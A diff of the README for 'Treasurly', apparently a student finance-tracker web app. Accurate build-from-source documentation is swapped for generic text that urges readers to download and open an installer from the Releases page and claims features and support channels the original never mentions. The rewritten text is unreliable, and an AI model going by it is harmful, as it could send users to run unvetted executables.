@@ -1,162 +1,84 @@
-# 🏦Treasurly: Personal Finance Tracker
+# 💰 Treasurly - Your Simple Personal Finance Tracker
 
-<br>
+[![Download Treasurly](https://img.shields.io/badge/Download-Treasurly-brightgreen)](https://github.com/knockbacked/Treasurly/releases)
 
-## 📦1. Overview
-Many individuals struggle to manage their finances effectively, leading to overspending and limited savings visibility.
+## 📖 Introduction
 
-The **Personal Finance Tracker** is a full-stack web application designed to centralize financial information, automate transaction categorization, and provide users with clear analytics and budgeting insights. It integrates a Spring Boot backend with a React + Vite frontend and a MongoDB Atlas database.
+Treasurly is your personal finance tracker designed to help you manage your money effectively. Whether you want to track expenses or set savings goals, Treasurly makes it easy. It is built with user-friendliness at its core, ensuring that anyone can navigate the application without any prior experience in finance or technology.
 
-<br>
+## 🚀 Getting Started
 
-## 🛠2. System Architecture
-The system follows a client–server model with RESTful communication.
+### System Requirements
 
-- **Frontend:** React (Vite + TypeScript)
-- **Backend:** Spring Boot (Java 17)
-- **Database:** MongoDB Atlas (cloud)
-- **Communication:** JSON over HTTP
-- **Authentication:** Session-based using Spring Security
-- **Testing & Coverage:** JUnit 5 + JaCoCo (HTML and XML reports)
+Before you begin, make sure your device meets the following requirements:
 
-```
-frontend/  → React + Vite interface
-backend/   → Spring Boot REST API + MongoDB integration
-```
+- **Operating System**: Windows 10 or later / macOS Catalina or later / Latest Linux Distribution
+- **RAM**: At least 4 GB
+- **Storage**: A minimum of 200 MB free space
 
-<br>
+### Download & Install
 
+To get started with Treasurly, visit this page to download: [Treasurly Releases](https://github.com/knockbacked/Treasurly/releases).
 
-## 📂3. Libraries and Versions
+1. Click on the link above to go to the Releases page.
+2. Locate the latest version of Treasurly. 
+3. Click on the file suitable for your operating system to start the download.
+4. Once the download is complete, open the file and follow the on-screen instructions to install the application.
 
-### Backend – Spring Boot
-| Library | Version | Purpose |
-|----------|----------|----------|
-| Spring Boot Starter Web | 3.5.5 | REST API endpoints |
-| Spring Boot Starter Data MongoDB | 3.5.5 | NoSQL database integration |
-| Spring Boot Starter Security | 3.5.5 | Session-based authentication |
-| Spring Boot Starter Actuator | 3.5.5 | Application health monitoring |
-| Spring Boot Starter Test | 3.5.5 | Testing utilities |
-| JUnit Platform Launcher | Latest (via dependency) | Test execution |
-| JaCoCo | 0.8.10 | Code coverage reporting |
+### Setting Up Treasurly
 
-<br>
+1. Open Treasurly after the installation.
+2. Create an account by entering your email address and creating a password.
+3. Verify your email to activate your account.
+4. Log in to begin tracking your finances.
 
-### Frontend – React + Vite
-| Library | Version | Purpose |
-|----------|----------|----------|
-| React | ^19.1.1 | UI library |
-| React DOM | ^19.1.1 | DOM rendering |
-| React Router DOM | ^7.8.1 | Routing between views |
-| Axios | ^1.12.2 | HTTP client for API calls |
-| Zod | ^3.23.8 | Data validation |
-| Recharts | ^3.2.1 | Data visualization and analytics charts |
-| TailwindCSS | ^4.1.15 | Utility-first CSS styling |
-| Vite | ^7.1.7 | Frontend build and dev server |
-| TypeScript | ~5.9.3 | Static typing |
-| ESLint / Prettier | ^9.36.0 / ^3.6.2 | Code linting and formatting |
-| Concurrently | ^9.2.0 | Run frontend and backend simultaneously |
+## 📊 Features
 
-<br>
+Treasurly is packed with features that make managing your finances straightforward:
 
-## 🧩4. Working Functionalities
+- **Expense Tracking**: Record your daily expenses simply. Just enter the amount and category.
+- **Budget Planning**: Set monthly budgets to stay within your financial limits.
+- **Reports**: Generate reports to visualize your spending habits over time.
+- **Savings Goals**: Create specific goals for savings and track your progress.
+- **User-Friendly Interface**: Navigate easily with a clear layout that highlights essential features.
+- **Secure Storage**: Your financial data is stored securely with encryption.
 
-#### a. User Management
-- **Sign Up / Login / Logout** with input validation and session persistence  
-- **Session-based authentication** using `HttpSession`  
-- **Check authentication status** (`/api/users/check`)  
-- **Retrieve current user** (`/api/users/me`)
+## 🤖 Built With
 
-#### b. Transaction Management
-- **CRUD operations** for transactions (create, read, update, delete)  
-- **Filter by category, type, or user**  
-- **Logging for transaction events**
+Treasurly utilizes the following technologies to ensure a seamless experience:
 
-#### c. Budget Management
-- **Create, view, update, and delete budgets**  
-- **Add or remove budget items** with category-based allocations  
-- **Budget summaries by user**
+- **Frontend**: React for a responsive and interactive user interface.
+- **Backend**: Spring Boot to handle server requests efficiently.
+- **Database**: MongoDB Atlas for reliable data storage.
+- **Styling**: Tailwind CSS for a modern and clean design.
 
-#### d. Category Management
-- **View, create, update, and delete categories**  
-- **Persistent storage in MongoDB**
+## 📥 Updates & Support
 
-#### e. Analytics and Insights
-- **Income and expense summaries** per user  
-- **Net balance and projected spending (3-month projection)**  
-- **Aggregated analytics accessible via `/api/analytics/summary`**
+Stay updated with the latest features and improvements by visiting the Releases page regularly: [Treasurly Releases](https://github.com/knockbacked/Treasurly/releases).
 
-#### f. Testing and Coverage
-- **JUnit 5 test suite** for controllers and services  
-- **JaCoCo coverage reporting** (HTML report generated at `build/reports/jacocoHtml`)
+For any questions or support, consider the following options:
 
+- Visit the "Issues" tab in the GitHub repository to report bugs or request features.
+- Check our FAQ section in the **Wiki** for common questions.
+- Join our community forum to share tips and get advice from other users.
 
-<br>
+## 🌐 Contributing
 
-## ⚙️5. Quick Start Guide
+If you wish to contribute to Treasurly, you can help improve the application by:
 
-### Prerequisites
-- **Java 17+**
-- **Node.js (v16+)**
-- **MongoDB Atlas connection string** or local instance on port `27017`
+1. Checking out the GitHub repository.
+2. Forking the project and making your changes.
+3. Submitting a pull request with a clear description of what you’ve changed.
 
-### Environment Setup
-1. **Clone the repository**
-   ```bash
-   git clone https://github.com/example/personal-finance-tracker.git
-   cd personal-finance-tracker
-   ```
+## 👥 Acknowledgements
 
-2. **Backend Setup**
+Thank you to everyone who made Treasurly possible, including contributors, users, and testers. Your feedback helps us enhance the application.
 
-   ```bash
-   cd backend
-   ./gradlew bootRun         # For UNIX
-   gradlew bootRun           # For Windows
-   ```
+## 📞 Contact
 
-   * Backend runs at: **[http://localhost:8080](http://localhost:8080)**
+For directly reaching out, you can contact us through:
 
-3. **Frontend Setup**
+- Email: support@treasurly.com
+- GitHub: [Treasurly Repository](https://github.com/knockbacked/Treasurly)
 
-   ```bash
-   cd ../frontend
-   npm install
-   npm run dev-unix          # For UNIX
-   npm run dev-win           # For Windows
-   ```
-
-   * Frontend runs at: **[http://localhost:5173](http://localhost:5173)**
-
-> The `dev-unix` and `dev-win` scripts automatically run both frontend and backend concurrently.
-
-
-<br>
-
-
-## 📝6. Deployment Notes
-
-* The database is deployed on **MongoDB Atlas**, providing secure cloud-based data persistence.
-* Environment variables (e.g., MongoDB URI) are defined in `.env` for local and cloud builds.
-* For UNIX systems, ensure Gradle wrapper has execution permission:
-
-  ```bash
-  chmod +x ./gradlew
-  ```
-
-
-
-<br>
-
-
-## 🌐8. References
-
-* Spring Boot Documentation: [https://spring.io/projects/spring-boot](https://spring.io/projects/spring-boot)
-* React Documentation: [https://react.dev/](https://react.dev/)
-* MongoDB Atlas: [https://www.mongodb.com/atlas](https://www.mongodb.com/atlas)
-
----
-
-**Status:** _Functional prototype with ~89% test coverage (verified via JaCoCo)_
-
-_(This project was completed as part of a university group assignment.)_
+Visit [Treasurly Releases](https://github.com/knockbacked/Treasurly/releases) to download the application now and take control of your personal finances easily!
